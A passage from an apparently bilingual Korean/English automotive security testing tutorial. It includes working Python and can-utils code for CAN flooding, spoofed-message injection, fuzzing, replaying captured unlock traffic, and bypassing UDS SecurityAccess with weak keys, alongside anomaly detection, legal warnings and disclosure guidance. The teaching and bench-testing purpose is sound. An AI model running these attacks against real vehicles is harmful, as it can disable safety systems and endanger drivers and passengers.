        if key_resp and key_resp[0] == 0x67:
            result["bypassed"] = True
            result["key"] = key.hex()
            result["key_algorithm"] = description
            print(f"  [!!] SecurityAccess 우회 성공! 알고리즘: {description}, 키: {key.hex()}")
            break
        else:
            parsed = parse_uds_response(key_resp) if key_resp else {}
            print(f"  [-] 실패: {parsed.get('nrc_desc', 'no response')}")

    return result


def main() -> None:
    parser = argparse.ArgumentParser(
        description="UDS 보안 테스트",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  python3 uds_test.py --interface vcan0 enum
  python3 uds_test.py --interface vcan0 secaccess --level 0x01
""",
    )
    parser.add_argument("--interface", default="vcan0", help="CAN 인터페이스")
    parser.add_argument("--txid", type=lambda x: int(x, 16), default=0x7DF,
                        help="송신 CAN ID (기본: 0x7DF 브로드캐스트)")
    parser.add_argument("--rxid", type=lambda x: int(x, 16), default=0x7E8,
                        help="수신 CAN ID (기본: 0x7E8)")

    sub = parser.add_subparsers(dest="cmd", required=True)
    sub.add_parser("enum", help="UDS 서비스 열거")

    sec_p = sub.add_parser("secaccess", help="SecurityAccess 취약점 테스트")
    sec_p.add_argument("--level", type=lambda x: int(x, 16), default=0x01,
                       help="보안 레벨 (기본: 0x01)")

    args = parser.parse_args()

    # 실제 CAN 환경에서는 ISO-TP (python-isotp) 사용
    # 여기서는 더미 전송 함수로 시뮬레이션
    def dummy_send(data: bytes) -> bytes | None:
        print(f"    TX [{hex(args.txid)}]: {data.hex()}")
        # 실제 구현: can.interface.Bus + isotp.socket 사용
        return None

    match args.cmd:
        case "enum":
            print(f"[*] UDS 서비스 열거 (TX:{hex(args.txid)}, RX:{hex(args.rxid)})")
            services = enumerate_uds_services(dummy_send)
            print(f"\n발견된 서비스 수: {len(services)}")

        case "secaccess":
            print(f"[*] SecurityAccess 레벨 {hex(args.level)} 테스트")
            result = test_security_access(dummy_send, args.level)
            if result.get("bypassed"):
                print(f"\n[!!] 취약점 발견: {result}")
            else:
                print("\n[+] SecurityAccess 우회 실패 (예상된 동작)")


if __name__ == "__main__":
    main()
```

---

## 4. 자동차 보안 테스트 체크리스트

### 테스트 범위 전체 요약

```
자동차 공격 표면
    │
    ├── 내부 네트워크
    │     CAN Bus, LIN, FlexRay, Ethernet (BroadR-Reach)
    │
    ├── 외부 연결
    │     OBD-II 포트, Wi-Fi, Bluetooth, Cellular (4G/5G)
    │     V2X (Vehicle-to-Everything)
    │
    ├── ECU (Electronic Control Unit)
    │     엔진/변속기/ABS/에어백/인포테인먼트
    │     펌웨어 추출·분석·수정
    │
    └── OTA (Over-the-Air) 업데이트
          업데이트 서버, 서명 검증, 롤백 방지
```

| 테스트 항목 | 도구 | 위험 등급 |
|-------------|------|----------|
| CAN 퍼징 | python-can, Scapy | 안전 기능 비활성화 가능 |
| UDS SecurityAccess 우회 | udsoncan, python-can | 무단 ECU 접근 |
| OBD-II 진단 | ELM327 + OBD Library | 주행 데이터 유출 |
| Bluetooth 페어링 | btlejack, hcitool | MITM 공격 |
| OTA 업데이트 위조 | Burp Suite | 악성 펌웨어 설치 |
| V2X 스푸핑 | USRP + GNU Radio | 교통 신호 조작 |

### 책임 있는 공개 (Responsible Disclosure)

자동차 보안 취약점 발견 시:

1. 즉시 차량 제조사 보안팀에 연락 (대부분 버그 바운티 프로그램 운영)
2. 30~90일 패치 기간 부여
3. 패치 배포 후 공개 발표
4. 취약점 정보를 ICS-CERT, AUTO-ISAC에도 공유 가능

---

<!-- detect-validate-36 -->
## 자동차 보안 테스트 검증 (설정됨 ≠ 작동함)

자동차 보안 테스트는 *침투 테스트·CAN 퍼징·UDS 진단 테스트*로 취약을 찾는다. "테스트했다"는 활동과 "발견 통제가 실제로 작동한다"는 다르다 — 각 통제를 소유 차량/벤치에서 검증한다.

### 검증 항목 → 확인 질문 → 측정 신호 → 함정

| 검증 항목 | 확인 질문 | 측정 신호 | 함정 |
|---|---|---|---|
| 메시지 인증 | 인젝션이 거부되나? | 위조 ID 미반영 | 퍼징만, 무대응검증 |
| 진단 보호 | 시드-키 강한가? | 브루트 시도 차단 | 알고리즘 추측 가능 |
| 도메인 격리 | IVI→제어 막히나? | 게이트웨이 필터링 | 평면 네트워크 |
| OTA 무결성 | 미서명 거부? | 변조 패키지 실패 | 검증만, 미강제 |

### 평가 검증 (직접 확인)

```bash
# 1) 소유 벤치에서 인젝션 후 ECU 무반응 확인 — 위조 ID가 거부되면 인증 동작 신호
cansend vcan0 123#DEADBEEF 2>/dev/null; candump -n 5 vcan0 2>/dev/null | grep -c ' 1A4 '  # 반응 ID 미출현이어야
# 2) UDS 시드-키 추측 가능성 점검(소유 펌웨어) — 고정/약한 키 상수가 신호
strings -n 6 owned_ecu.bin 2>/dev/null | grep -iE 'masterkey|fixedseed|0x12345678' | head
```

> 자동차 테스트는 *통제가 작동하는가*다 — "퍼징했다"와 "위조 ID가 거부되고 시드-키가 강하며 IVI가 제어에 못 닿는다"는 다르다. 각 통제를 소유 차량/벤치에서 직접 검증한다([[62_Automotive_Security]], [[34_Hardware_Hacking]], [[48_Threat_Modeling]]).

---

<a name="english"></a>

# Automotive Security Testing — Penetration Testing, Fuzzing & Authentication Validation

## Learning Objectives

After completing this document you will be able to:

- Explain what ECUs, CAN Bus, and OBD-II are in plain language
- Parse a CAN frame (ID, DLC, Data) manually
- Identify the full attack surface of a modern vehicle
- Interact with a CAN Bus using python-can, can-utils, and SocketCAN
- Implement CAN fuzzing, replay attacks, and anomaly detection in Python
- Test UDS SecurityAccess (0x27) for weak key algorithms
- Describe the legal and ethical requirements for automotive security testing

---

## Background: Automotive Networking Basics

### What Is an ECU?

An ECU (Electronic Control Unit) is **a dedicated computer inside the vehicle.**

A modern car contains between 30 and 150 ECUs:

| ECU | Function |
|-----|----------|
| ECM (Engine Control Module) | Fuel injection, ignition timing |
| TCM (Transmission Control) | Automatic gearbox control |
| ABS Module | Anti-lock braking |
| BCM (Body Control Module) | Door locks, windows, lighting |
| ADAS ECU | Lane keeping, collision warning |
| IVI (In-Vehicle Infotainment) | Navigation, audio, apps |
| TPMS | Tyre pressure monitoring |

These ECUs constantly exchange messages. The shared medium for that communication is the **CAN Bus**.

---

### What Is CAN Bus?

CAN (Controller Area Network) Bus is the **internal network that connects ECUs** inside a vehicle.

Think of it like a company intranet: each department (ECU) broadcasts messages on the internal network (CAN), and every other department can read them.

Key characteristics:

- **Broadcast**: every message is visible to all connected ECUs — no private channels
- **No authentication**: there is no built-in mechanism to verify the sender ← security weakness
- **Priority-based**: lower CAN ID = higher priority; collisions resolved by bus arbitration
- **Speed**: classic CAN up to 1 Mbps; CAN FD up to 5 Mbps

```
CAN Bus physical topology:
                          CAN High (+)
ECU1 ─────┬─────┬─────┬──────────────── termination resistor (120 Ω)
           │     │     │
          ECU2  ECU3  OBD-II port
                      (external access point)
                          CAN Low (-)
ECU1 ─────┴─────┴─────┴──────────────── termination resistor (120 Ω)
```

---

### CAN Frame Structure

A CAN message (frame) has a simple fixed structure:

```
Standard CAN frame (11-bit ID):
┌──────────┬─────────────────────┬─────┬──────────────────────────┐
│  ID      │  control fields     │ DLC │  Data                    │
│ (11 bit) │  (SOF, RTR, etc.)  │(4b) │  (0–8 bytes)             │
└──────────┴─────────────────────┴─────┴──────────────────────────┘

Fields:
- ID  (Arbitration ID): identifies the message type (0x000–0x7FF)
     Example: 0x200 = engine RPM data, 0x350 = vehicle speed
- DLC (Data Length Code): number of data bytes (0–8)
- Data: the payload; encoding varies per vehicle (defined in DBC files)

Example frame (hexadecimal):
  ID: 0x200  DLC: 8  Data: 0F A0 00 00 00 00 00 00
  First two bytes 0x0FA0 = 4000 decimal
  If RPM formula is raw × 0.25 → 1000 RPM
```

---

### What Is OBD-II?

**OBD-II (On-Board Diagnostics II)** is the standardised diagnostic port on every vehicle made after 1996.

> Like a USB port on a laptop — it gives external devices direct access to the vehicle's internal networks.

```
OBD-II port location: under the driver's dashboard (16-pin connector)

Relevant pins:
  Pin 6  = CAN High (High Speed CAN)
  Pin 14 = CAN Low  (High Speed CAN)
  Pin 16 = Battery (+12 V)
  Pin 4/5 = Ground

Use cases:
  Mechanic:          read/clear fault codes (DTCs)
  Security researcher: sniff and inject CAN traffic
  Attacker:          inject malicious messages (requires physical access)
```

---

### Modern Vehicle Attack Surface

```
Full attack surface map
    │
    ├── Physical access (close range)
    │     ├── OBD-II port (direct CAN access)
    │     ├── USB port (IVI system)
    │     ├── SD card slot (firmware update)
    │     └── JTAG/UART (direct ECU debug)
    │
    ├── Short-range wireless (metres)
    │     ├── Bluetooth (phone pairing, audio)
    │     ├── Wi-Fi (hotspot, software updates)
    │     └── TPMS sensors (315/433 MHz)
    │
    ├── Medium-range wireless
    │     ├── RKE (Remote Keyless Entry)
    │     └── DSRC (V2X, traffic infrastructure)
    │
    └── Long-range wireless (internet)
          ├── Cellular (4G/5G telematics)
          ├── OTA updates (wireless firmware delivery)
          └── Companion app API
```

**Real-World Case: 2015 Jeep Cherokee Remote Hack**

Researchers Charlie Miller and Chris Valasek demonstrated in 2015 that they could:

1. Connect to the Uconnect IVI system over the cellular network
2. Escalate privileges from the IVI to the CAN Bus
3. Remotely control the air conditioning, radio, and windscreen wipers of a Jeep driving at highway speed
4. Finally demonstrate **remote engine kill** and **brake disabling**

Result: Fiat Chrysler issued a recall for 1.4 million vehicles and distributed a patch.

This case proved that automotive security is not just an IT concern — it directly affects **physical human safety**.

---

## Legal Considerations

> Warning: automotive security testing requires explicit written authorisation.

```
Legitimate testing environments:
  ✓ Your own vehicle (check local laws before road use after modification)
  ✓ Manufacturer / research lab with signed agreement
  ✓ Isolated CANbus simulator or hardware-in-the-loop (HiL) test bench
  ✓ Accredited automotive security laboratory

Illegal / dangerous activities:
  ✗ Accessing someone else's vehicle without permission
  ✗ Injecting CAN messages while driving on public roads
  ✗ Remote wireless attacks without manufacturer authorisation
  ✗ Testing safety-critical systems (ABS, airbag, brakes) on a live vehicle
```

---

## Test Environment Setup

### Option 1: Physical Vehicle + Static Environment

```bash
# Required hardware:
# - ELM327 USB adapter (OBD-II → USB/serial)
# - Laptop or Raspberry Pi
# - python-can and can-utils

# Load SocketCAN kernel modules
sudo modprobe can
sudo modprobe can_raw
sudo modprobe slcan

# Bind ELM327 to a SocketCAN interface
sudo slcand -o -s6 -t hw -S 3000000 /dev/ttyUSB0
sudo ip link set slcan0 up

# Live traffic capture
candump slcan0
```

### Option 2: Virtual CAN (vcan) — No Hardware Required

```bash
# Load the virtual CAN module
sudo modprobe vcan

# Create a virtual interface
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Terminal 1: receive
candump vcan0

# Terminal 2: send a test frame
cansend vcan0 123#DEADBEEF
```

---

## CAN Bus Attack Types

### 1. CAN Flooding (Denial-of-Service)

Inject a very high rate of messages to saturate the bus and prevent legitimate ECUs from communicating:

```python
import time
import can

def can_flood(interface: str = "vcan0", target_id: int = 0x000, duration: float = 5.0) -> int:
    """Flood the CAN bus with high-priority messages (simulation only)."""
    bus = can.interface.Bus(interface, bustype="socketcan")
    msg = can.Message(
        arbitration_id=target_id,
        data=b"\xFF" * 8,
        is_extended_id=False,
    )
    count = 0
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            bus.send(msg)
            count += 1
        except can.CanError:
            break
    bus.shutdown()
    print(f"[+] Sent {count} frames over {duration} seconds")
    return count
```

### 2. CAN Spoofing (Injecting Fake Messages)

Inject forged messages with a legitimate-looking ID to manipulate vehicle behaviour:

```python
def inject_spoofed_rpm(interface: str = "vcan0", target_rpm: int = 3000) -> None:
    """
    Inject a forged engine RPM message.
    On a real vehicle, the instrument cluster would display the wrong RPM.
    """
    bus = can.interface.Bus(interface, bustype="socketcan")

    # RPM encoding example: raw = RPM / 0.25 (varies by vehicle — check DBC file)
    rpm_raw = int(target_rpm / 0.25)
    data = rpm_raw.to_bytes(2, "big") + b"\x00" * 6

    msg = can.Message(
        arbitration_id=0x200,   # example ID — varies by vehicle
        data=data,
        is_extended_id=False,
    )
    bus.send(msg)
    bus.shutdown()
    print(f"[*] Injected spoofed RPM {target_rpm} (raw: {hex(rpm_raw)})")
```

### 3. ECU Replay Attack

Capture a sequence of legitimate CAN frames, then replay them to reproduce a specific action (e.g., unlocking the doors):

```bash
# 1. Capture traffic while performing the target action
candump vcan0 -l unlock_capture.log

# 2. Identify the relevant message IDs in the log

# 3. Replay to repeat the action
canplayer -I unlock_capture.log vcan0
```

---

## Security Testing Tools

### SocketCAN + can-utils

Built into the Linux kernel:

```bash
# Install
sudo apt-get install can-utils

# Key commands:
candump vcan0                          # receive all frames in real time
candump vcan0 | grep " 200 "          # filter to ID 0x200 only
cansend vcan0 200#0FA000000000000     # send a single frame
cangen vcan0 -D i -L 8               # generate random frames
canplayer -I logfile.log vcan0        # replay a log file
canbusload vcan0@500000               # measure bus load
```

### python-can

The standard Python library for CAN:

```bash
pip install python-can
# Supports: socketcan, kvaser, pcan, vector, ixxat, ...
```

```python
import can

# Receive
bus = can.interface.Bus("vcan0", bustype="socketcan")
message = bus.recv(timeout=2.0)
if message:
    print(f"ID: {hex(message.arbitration_id)}, Data: {message.data.hex()}")
bus.shutdown()

# Transmit
bus = can.interface.Bus("vcan0", bustype="socketcan")
msg = can.Message(arbitration_id=0x123, data=b"\x01\x02\x03", is_extended_id=False)
bus.send(msg)
bus.shutdown()
```

---

## 2. CAN Bus Fuzzing Automation

```python
#!/usr/bin/env python3
"""CAN Bus Security Testing — Fuzzing, Replay Attacks & Anomaly Detection.

Usage:
  python3 can_security.py fuzz --start 0x000 --end 0x7FF --iface vcan0
  python3 can_security.py replay capture.log --iface vcan0
  python3 can_security.py monitor --iface vcan0 --duration 60 --baseline baseline.json -o result.json
"""

import argparse
import json
import random
import time
from dataclasses import dataclass, field
from pathlib import Path


@dataclass
class CANFrame:
    """Represents a single CAN frame."""
    arbitration_id: int        # 11-bit CAN ID (0x000–0x7FF)
    data: bytes                # payload (0–8 bytes)
    timestamp: float = field(default_factory=time.time)
    is_extended: bool = False  # True for 29-bit extended ID

    def to_dict(self) -> dict:
        return {
            "id": hex(self.arbitration_id),
            "data": self.data.hex(),
            "timestamp": self.timestamp,
            "extended": self.is_extended,
        }


def send_can_frame(frame: CANFrame, interface: str = "vcan0") -> bool:
    """Send a CAN frame using python-can."""
    try:
        import can
        bus = can.interface.Bus(interface, bustype="socketcan")
        msg = can.Message(
            arbitration_id=frame.arbitration_id,
            data=frame.data,
            is_extended_id=frame.is_extended,
        )
        bus.send(msg)
        bus.shutdown()
        return True
    except Exception as e:
        print(f"Send failed: {e}")
        return False


def fuzz_can_id_range(
    start_id: int,
    end_id: int,
    data_pattern: bytes | None = None,
    delay: float = 0.01,
    interface: str = "vcan0",
) -> list[CANFrame]:
    """
    Fuzz a range of CAN IDs by sending random (or fixed) data to each one.

    Args:
        start_id: first CAN ID to fuzz (inclusive)
        end_id: last CAN ID to fuzz (inclusive)
        data_pattern: fixed payload to use; None generates random 8-byte data
        delay: pause between frames in seconds (prevents bus overload)
        interface: SocketCAN interface name
    """
    sent: list[CANFrame] = []
    total = end_id - start_id + 1
    print(f"[*] Fuzzing CAN IDs {hex(start_id)}–{hex(end_id)} ({total} IDs)")

    for arb_id in range(start_id, end_id + 1):
        data = data_pattern or bytes([random.randint(0, 255) for _ in range(8)])
        frame = CANFrame(arbitration_id=arb_id, data=data)
        print(f"[>] CAN ID {hex(arb_id):6s}: {data.hex()}")
        send_can_frame(frame, interface)
        sent.append(frame)
        time.sleep(delay)

    print(f"\n[+] Fuzzing complete: {len(sent)} frames sent")
    return sent


def replay_can_log(log_file: Path, interface: str = "vcan0", speed: float = 1.0) -> int:
    """
    Replay a captured CAN log file (candump format).

    candump log format:
      (1234567890.123456) vcan0 200#0FA000000000000

    Args:
        log_file: path to candump log file
        interface: CAN interface to replay on
        speed: playback speed multiplier (1.0 = real time, 2.0 = double speed)
    """
    frames: list[tuple[float, CANFrame]] = []

    with log_file.open() as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split()
            if len(parts) >= 3:
                try:
                    ts = float(parts[0].strip("()"))
                    arb_id_str, _, data_hex = parts[2].partition("#")
                    arb_id = int(arb_id_str, 16)
                    data = bytes.fromhex(data_hex[:16])   # max 8 bytes (16 hex chars)
                    frames.append((ts, CANFrame(arb_id, data, ts)))
                except (ValueError, IndexError):
                    continue

    if not frames:
        print("[-] No valid frames found in log file")
        return 0

    print(f"[*] Replaying {len(frames)} frames at {speed}x speed")
    start_ts = frames[0][0]
    start_time = time.time()

    for orig_ts, frame in frames:
        elapsed_orig = (orig_ts - start_ts) / speed
        elapsed_real = time.time() - start_time
        sleep_time = elapsed_orig - elapsed_real
        if sleep_time > 0:
            time.sleep(sleep_time)
        send_can_frame(frame, interface)

    return len(frames)


def monitor_can_anomalies(
    interface: str = "vcan0",
    duration: int = 60,
    baseline_file: Path | None = None,
) -> dict:
    """
    Monitor CAN traffic and detect anomalies against a baseline.

    Anomaly criteria:
    1. A known ID's message frequency deviates more than 50 % from baseline
    2. A new (unknown) ID appears at over 100 Hz — suggests flooding

    Args:
        interface: CAN interface to monitor
        duration: monitoring window in seconds
        baseline_file: JSON file of normal traffic baseline (optional)
    """
    try:
        import can
    except ImportError:
        print("Install python-can first: pip install python-can")
        return {}

    baseline: dict[str, dict] = {}
    if baseline_file and baseline_file.exists():
        baseline = json.loads(baseline_file.read_text())
        print(f"[*] Baseline loaded: {len(baseline)} known IDs")

    bus = can.interface.Bus(interface, bustype="socketcan")
    id_stats: dict[int, dict] = {}
    start = time.time()

    print(f"[*] Monitoring {interface} for {duration} seconds...")
    try:
        while time.time() - start < duration:
            msg = bus.recv(timeout=1.0)
            if not msg:
                continue
            arb_id = msg.arbitration_id
            if arb_id not in id_stats:
                id_stats[arb_id] = {"count": 0, "last_data": [], "freq_hz": 0}
            id_stats[arb_id]["count"] += 1
            id_stats[arb_id]["last_data"] = list(msg.data)
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    finally:
        bus.shutdown()

    elapsed = time.time() - start
    anomalies: list[dict] = []

    for arb_id, stats in id_stats.items():
        freq = stats["count"] / elapsed
        stats["freq_hz"] = round(freq, 2)
        hex_id = hex(arb_id)

        if hex_id in baseline:
            base_freq = baseline[hex_id].get("freq_hz", 0)
            if base_freq > 0 and abs(freq - base_freq) / base_freq > 0.5:
                anomalies.append({
                    "id": hex_id,
                    "issue": f"Frequency anomaly: {freq:.1f} Hz vs baseline {base_freq:.1f} Hz",
                    "severity": "high" if abs(freq - base_freq) / base_freq > 2 else "medium",
                })
        elif freq > 100:
            anomalies.append({
                "id": hex_id,
                "issue": f"High-frequency unknown ID: {freq:.1f} Hz (possible flood)",
                "severity": "high",
            })

    result = {
        "duration": round(elapsed, 1),
        "total_ids": len(id_stats),
        "total_frames": sum(s["count"] for s in id_stats.values()),
        "anomalies": anomalies,
        "id_stats": {hex(k): v for k, v in id_stats.items()},
    }

    if anomalies:
        print(f"\n[!] {len(anomalies)} anomaly(ies) detected:")
        for a in anomalies:
            print(f"  [{a['severity'].upper()}] {a['id']}: {a['issue']}")
    else:
        print("[+] No anomalies detected")

    return result


def main() -> None:
    parser = argparse.ArgumentParser(
        description="CAN Bus Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 can_security.py fuzz --start 0x000 --end 0x7FF
  python3 can_security.py replay capture.log --speed 2.0
  python3 can_security.py monitor --duration 120 --baseline normal.json -o report.json
""",
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    fuzz_p = sub.add_parser("fuzz", help="Fuzz a CAN ID range")
    fuzz_p.add_argument("--start", type=lambda x: int(x, 16), default=0x000)
    fuzz_p.add_argument("--end", type=lambda x: int(x, 16), default=0x7FF)
    fuzz_p.add_argument("--iface", default="vcan0")
    fuzz_p.add_argument("--delay", type=float, default=0.01)
    fuzz_p.add_argument("-o", "--output", type=Path)

    replay_p = sub.add_parser("replay", help="Replay a CAN log file")
    replay_p.add_argument("log", type=Path)
    replay_p.add_argument("--iface", default="vcan0")
    replay_p.add_argument("--speed", type=float, default=1.0)

    monitor_p = sub.add_parser("monitor", help="Anomaly-detection monitoring")
    monitor_p.add_argument("--iface", default="vcan0")
    monitor_p.add_argument("--duration", type=int, default=60)
    monitor_p.add_argument("--baseline", type=Path)
    monitor_p.add_argument("-o", "--output", type=Path)

    args = parser.parse_args()

    match args.cmd:
        case "fuzz":
            frames = fuzz_can_id_range(
                args.start, args.end, delay=args.delay, interface=args.iface
            )
            if args.output:
                args.output.write_text(
                    json.dumps([f.to_dict() for f in frames], indent=2)
                )
                print(f"[+] Results saved to {args.output}")

        case "replay":
            count = replay_can_log(args.log, args.iface, args.speed)
            print(f"[+] Replayed {count} frames")

        case "monitor":
            result = monitor_can_anomalies(args.iface, args.duration, args.baseline)
            print(f"\nTotal IDs: {result.get('total_ids')}, Total frames: {result.get('total_frames')}")
            if args.output:
                args.output.write_text(
                    json.dumps(result, indent=2, ensure_ascii=False)
                )
                print(f"[+] Results saved to {args.output}")


if __name__ == "__main__":
    main()
```

---

## 3. UDS Diagnostic Protocol Testing

### What Is UDS?

**UDS (Unified Diagnostic Services)**, defined in ISO 14229, is the standardised protocol for diagnosing and reprogramming ECUs.

A mechanic uses it to read fault codes, clear them, or flash new firmware. For a security tester, it is a potential pathway to unauthorised ECU control.

```
UDS communication model:
  Requester → ECU: [Service ID] [Sub-function] [Data...]
  ECU → Requester: Positive response: [Service ID + 0x40] [Data...]
                   Negative response: [0x7F] [Service ID] [NRC]

Transported over CAN using ISO 15765-2 (ISO-TP) for multi-frame messages.
```

```python
#!/usr/bin/env python3
"""UDS (Unified Diagnostic Services) Security Testing.

Usage:
  python3 uds_test.py --interface vcan0 enum
  python3 uds_test.py --interface vcan0 secaccess --level 0x01
"""

import argparse
import time


UDS_SERVICES = {
    0x10: "DiagnosticSessionControl",
    0x11: "ECUReset",
    0x14: "ClearDiagnosticInformation",
    0x19: "ReadDTCInformation",
    0x22: "ReadDataByIdentifier",
    0x23: "ReadMemoryByAddress",
    0x27: "SecurityAccess",
    0x28: "CommunicationControl",
    0x2E: "WriteDataByIdentifier",
    0x31: "RoutineControl",
    0x34: "RequestDownload",
    0x36: "TransferData",
    0x37: "RequestTransferExit",
    0x3D: "WriteMemoryByAddress",
    0x3E: "TesterPresent",
    0x85: "ControlDTCSetting",
}

UDS_NRC = {
    0x10: "generalReject",
    0x11: "serviceNotSupported",
    0x12: "subFunctionNotSupported",
    0x22: "conditionsNotCorrect",
    0x24: "requestSequenceError",
    0x31: "requestOutOfRange",
    0x33: "securityAccessDenied",
    0x35: "invalidKey",
    0x36: "exceededNumberOfAttempts",
    0x37: "requiredTimeDelayNotExpired",
}


def build_uds_request(
    service_id: int,
    sub_func: int | None = None,
    data: bytes = b"",
) -> bytes:
    payload = bytes([service_id])
    if sub_func is not None:
        payload += bytes([sub_func])
    payload += data
    return payload


def parse_uds_response(response: bytes) -> dict:
    if not response:
        return {"type": "timeout", "raw": ""}

    if response[0] == 0x7F:
        svc = response[1] if len(response) > 1 else 0
        nrc = response[2] if len(response) > 2 else 0
        return {
            "type": "negative",
            "service": hex(svc),
            "nrc": hex(nrc),
            "nrc_desc": UDS_NRC.get(nrc, "unknown"),
            "raw": response.hex(),
        }
    return {
        "type": "positive",
        "response_id": hex(response[0]),
        "service": hex(response[0] - 0x40),
        "data": response[1:].hex(),
        "raw": response.hex(),
    }


def enumerate_uds_services(
    send_fn,              # Callable[[bytes], bytes | None]
    timeout: float = 0.5,
) -> list[dict]:
    """Enumerate all UDS service IDs by probing 0x00–0xFF."""
    available: list[dict] = []
    print("[*] Starting UDS service enumeration...")

    for svc_id in range(0x00, 0xFF):
        request = build_uds_request(svc_id)
        response = send_fn(request)

        if response and len(response) >= 1:
            parsed = parse_uds_response(response)
            # Any response other than "serviceNotSupported" means the service exists
            if parsed["type"] == "positive" or parsed.get("nrc") not in ("0x11",):
                svc_name = UDS_SERVICES.get(svc_id, f"Unknown_0x{svc_id:02X}")
                available.append({
                    "service_id": hex(svc_id),
                    "name": svc_name,
                    "response": response.hex(),
                    "status": parsed["type"],
                })
                print(f"  [+] {hex(svc_id):4s} ({svc_name}): {parsed['type']}")

        time.sleep(timeout)

    print(f"\n[+] Found {len(available)} service(s)")
    return available


def test_security_access(
    send_fn,
    level: int = 0x01,
) -> dict:
    """
    Test UDS SecurityAccess (0x27) for weak key algorithms.

    SecurityAccess challenge-response protocol:
    1. Tester → ECU: 0x27 0x01         (request seed, level 1)
    2. ECU → Tester: 0x67 0x01 [SEED]  (4-byte random seed)
    3. Tester → ECU: 0x27 0x02 [KEY]   (computed key)
    4. ECU → Tester: 0x67 0x02         (success)
               or:  0x7F 0x27 0x35     (invalid key)
    """
    result: dict = {"level": hex(level), "seed": None, "bypassed": False}

    seed_req = build_uds_request(0x27, level)
    print(f"[*] Requesting seed for SecurityAccess level {hex(level)}: {seed_req.hex()}")

    seed_resp = send_fn(seed_req)

    if not seed_resp or seed_resp[0] != 0x67:
        print(f"[-] Seed request failed: {seed_resp.hex() if seed_resp else 'no response'}")
        return result

    seed = seed_resp[2:]
    result["seed"] = seed.hex()
    print(f"[+] Seed received: {seed.hex()}")

    # Attempt common weak key algorithms used in vulnerable ECUs
    weak_keys: list[tuple[bytes, str]] = [
        (bytes([0x00] * len(seed)), "all zeros"),
        (bytes([0xFF] * len(seed)), "all 0xFF"),
        (bytes(b ^ 0xFF for b in seed), "bitwise NOT of seed"),
        (seed, "seed echoed back"),
        (seed[::-1], "reversed seed"),
        (bytes((b + 1) & 0xFF for b in seed), "seed + 1"),
    ]

    for key, description in weak_keys:
        key_req = build_uds_request(0x27, level + 1, key)
        print(f"  [*] Trying key ({description}): {key.hex()}")

        key_resp = send_fn(key_req)
        if key_resp and key_resp[0] == 0x67:
            result["bypassed"] = True
            result["key"] = key.hex()
            result["key_algorithm"] = description
            print(f"  [!!] SecurityAccess bypassed! Algorithm: {description}, Key: {key.hex()}")
            break
        else:
            parsed = parse_uds_response(key_resp) if key_resp else {}
            print(f"  [-] Failed: {parsed.get('nrc_desc', 'no response')}")

    return result


def main() -> None:
    parser = argparse.ArgumentParser(
        description="UDS Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 uds_test.py --interface vcan0 enum
  python3 uds_test.py --interface vcan0 secaccess --level 0x01
""",
    )
    parser.add_argument("--interface", default="vcan0")
    parser.add_argument("--txid", type=lambda x: int(x, 16), default=0x7DF,
                        help="Transmit CAN ID (default: 0x7DF broadcast)")
    parser.add_argument("--rxid", type=lambda x: int(x, 16), default=0x7E8,
                        help="Receive CAN ID (default: 0x7E8)")

    sub = parser.add_subparsers(dest="cmd", required=True)
    sub.add_parser("enum", help="Enumerate available UDS services")

    sec_p = sub.add_parser("secaccess", help="Test SecurityAccess for weak keys")
    sec_p.add_argument("--level", type=lambda x: int(x, 16), default=0x01,
                       help="Security level (default: 0x01)")

    args = parser.parse_args()

    # In a real CAN environment, replace this with ISO-TP transport (python-isotp)
    def dummy_send(data: bytes) -> bytes | None:
        print(f"    TX [{hex(args.txid)}]: {data.hex()}")
        return None   # real implementation: send over ISO-TP and wait for response

    match args.cmd:
        case "enum":
            print(f"[*] Enumerating UDS services (TX:{hex(args.txid)}, RX:{hex(args.rxid)})")
            services = enumerate_uds_services(dummy_send)
            print(f"\nServices found: {len(services)}")

        case "secaccess":
            print(f"[*] Testing SecurityAccess level {hex(args.level)}")
            result = test_security_access(dummy_send, args.level)
            if result.get("bypassed"):
                print(f"\n[!!] Vulnerability confirmed: {result}")
            else:
                print("\n[+] SecurityAccess bypass failed (expected behaviour)")


if __name__ == "__main__":
    main()
```

---

## 4. Automotive Security Testing Checklist

| Test Item | Tool | Risk Level |
|-----------|------|-----------|
| CAN Fuzzing | python-can, Scapy | Safety feature deactivation |
| UDS SecurityAccess Bypass | udsoncan, python-can | Unauthorized ECU access |
| OBD-II Diagnostics | ELM327 + OBD Library | Driving data leakage |
| Bluetooth Pairing | btlejack, hcitool | MITM attack |
| OTA Update Forgery | Burp Suite | Malicious firmware installation |
| V2X Spoofing | USRP + GNU Radio | Traffic signal manipulation |

### Responsible Disclosure

If you discover an automotive security vulnerability:

1. Contact the vehicle manufacturer's security team immediately (most run bug bounty programmes)
2. Allow 30–90 days for patch development
3. Coordinate a public disclosure date after the patch ships
4. Consider also notifying ICS-CERT and AUTO-ISAC (the automotive information sharing body)

<!-- detect-validate-36 -->
## Automotive Security Testing Validation (Configured != Working)

Automotive security testing finds flaws via *penetration testing, CAN fuzzing, and UDS diagnostic testing*. "We tested" differs from "the discovered controls actually work" -- validate each control on owned vehicles/benches.

### Validation item -> Question -> Measured signal -> Pitfall

| Validation item | Question | Measured signal | Pitfall |
|---|---|---|---|
| Message auth | Injection rejected? | Forged ID has no effect | Fuzz only, no response check |
| Diagnostic protection | Seed-key strong? | Brute attempts blocked | Algorithm guessable |
| Domain isolation | IVI->control blocked? | Gateway filters | Flat network |
| OTA integrity | Unsigned rejected? | Tampered package fails | Verify but not enforce |

### Assessment validation (verify directly)

```bash
# 1) On an owned bench, confirm no ECU reaction after injection — a forged ID being rejected signals auth works
cansend vcan0 123#DEADBEEF 2>/dev/null; candump -n 5 vcan0 2>/dev/null | grep -c ' 1A4 '  # reaction ID should not appear
# 2) Check UDS seed-key guessability (owned firmware) — fixed/weak key constants are the signal
strings -n 6 owned_ecu.bin 2>/dev/null | grep -iE 'masterkey|fixedseed|0x12345678' | head
```

